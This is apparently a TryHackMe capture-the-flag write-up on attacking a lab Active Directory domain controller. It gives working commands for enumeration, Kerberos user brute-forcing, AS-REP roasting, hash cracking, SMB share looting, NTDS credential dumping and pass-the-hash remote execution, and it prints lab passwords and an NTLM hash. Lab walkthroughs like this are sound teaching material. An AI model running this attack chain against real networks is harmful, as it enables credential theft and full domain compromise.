99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

## Enumeration
Starting off with an nmap scan on the target (I have already exported the IP address of the target to the variable $target)

```
nmap -p- -sV -sC $target --open
```

So we can see the Active Directory domain: spookysec.local

We can see that this is an AD with typical AD related services running such as Kerberos, SMB, RPC and LDAP. I will enumerate these services one-by-one to see if we can get a foothold.

### SMB
Nmap revealed SMB ports open on 149, 445. So let’s enumerate SMB further. We can use:

- enum4linux
- Nmap scripts specifically for SMB enumeration.
- crackmapexec

I am running these scans concurrently.

```
enum4linux -smb $target

nmap -p139,445 --script=smb-enum-shares -sC $target

crackmapexec smb $target
```

The SMB nmap script does not reveal anything that we have not already seen from the original nmap scan.

Why is port 445 open? Basic domain functions usually require Port 445 to be open. These functions include remote file access, software deployment, and system management.

#### crackmapexec
crackmapexec reveals some results about the target. This tool can also be used for brute-forcing (if we find some credentials)

Key info:

- Hostname: ATTACKTIVEDIREC
- Domain: spookysec.local
- OS: Windows 10 / Server 2019 Build 17763

#### enum4linux
The enum4linux scan gave us a Domain SID and the Netbios Domain Name of the machine:

SID: Security Identifiers. These identifiers ensure domains are distinguishable.

## Kerberos
This TryHackMe box comes with a user and password list for brute-forcing. Kerbrute is a tool used to enumerate valid user names (find out what usernames are legitimate and exist on the target system).

This is the best guide that I’ve found for installing and executing Kerbrute: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/

```
sudo ./kerbrute_linux_amd64 userenum — dc $target -d spookysec.local userlist.txt
```

The full output below shows a list of legitimate Kerberos user accounts that exist on this domain. That’s great for enumeration because we have more information to help us get a foothold.

Usernames such as svc-admin, administrator, backup are notable findings with potentially elevated privileges.

## ASREPRoasting
ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

AS-REP = Authentication Server Reply

Roasting = Slang for extracting a Kerberos-encrypted value (like a hash) that can be cracked offline

We can use impacket to attempt ASREPRoasting to retrieve Kerberos tickets. Starting off with the GetNPUsers.py script.

But what does it mean? It’s important to understand why we are using this script.

GetNPUsers.py = Get No Preauthentication Users

```
python3 examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile /home/kali/Downloads/userlist.txt -dc-ip 10.10.28.119
```

We can see below that I’ve found some information. I now know, that James can’t be AS-REP roasted.

User james doesn’t have UF_DONT_REQUIRE_PREAUTH set

A few minutes later I’ve found something.

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[long hash]
```

We can query a kerberos ticket from the user: svc-admin without a password. In other words, we can AS-REP roast this user.

We can also do a lookup for this hash type on Hashcat’s Wikipedia page.

- Hash type: Kerberos 5, etype 23, AS-REP
- Hash-mode: 18200

We can use hashcat to crack the hash. Hashes cannot be reversed unlike encryption/decryption. Hashes are rather compared against a database of known hashes and this how they are ‘cracked’.

Hashcat scan:

```
hashcat -m 18200 hash.txt wordlist.txt
```

Here’s the results of the scan, where the hash has been cracked successfully: `management2005`

**Username:** svc-admin  
**Password:** management2005

---

## SMBCLIENT
Administrative shares like C$, ADMIN$, and IPC$ are always visible to authenticated users on Windows systems by design. However, visibility doesn't necessarily mean access is possible.

We can use these credentials to dig for further information. For example, we know that the target has SMB services running on Port 139 and 445. There is a high possibility of SMB shares being shared publicly.

### Enumerate SMB shares:

```
smbclient -L \\$target -U 'svc-admin'
# or without prompt:
smbclient -L \\$target -U svc-admin%management2005
```

### Connect to a share:

```
smbclient \\$target\backup -U svc-admin%management2005
```

GUI Method (Kali):
- Open Files
- Type: `smb://$target/backup`
- Enter username: `svc-admin`, password: `management2005`

Use `dir`, `ls`, `get` to interact.

### Example:
`backup_credentials.txt` file contains a base64 encoded string:

```bash
base64 -d backup_credentials.txt
```

---

## Pass the Hash

Use impacket’s `secretsdump.py` with the backup account:

```bash
python3 examples/secretsdump.py spookysec.local/backup:backup2517860@$target
```

This reveals NTLM hashes including Administrator:

**Administrator hash:**  
`0e0363213e37b94221497260b0bcb4fc`

---

## Evil WinRM (PTH)

```bash
evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.157.141 -u Administrator
```

Use `cd`, `dir`, `type` to navigate and capture the flag.

---

## Netexec (alt to secretsdump)

```bash
netexec smb 10.10.157.141 -u backup -p backup2517860 --ntds
```

## Crackmapexec for Remote Commands

```bash
crackmapexec smb 10.10.157.141 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -x "whoami"
crackmapexec smb 10.10.157.141 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -X "whoami"
```

---

Thanks for reading. If you have questions, let me know. If you want to share something or get in touch, comment below.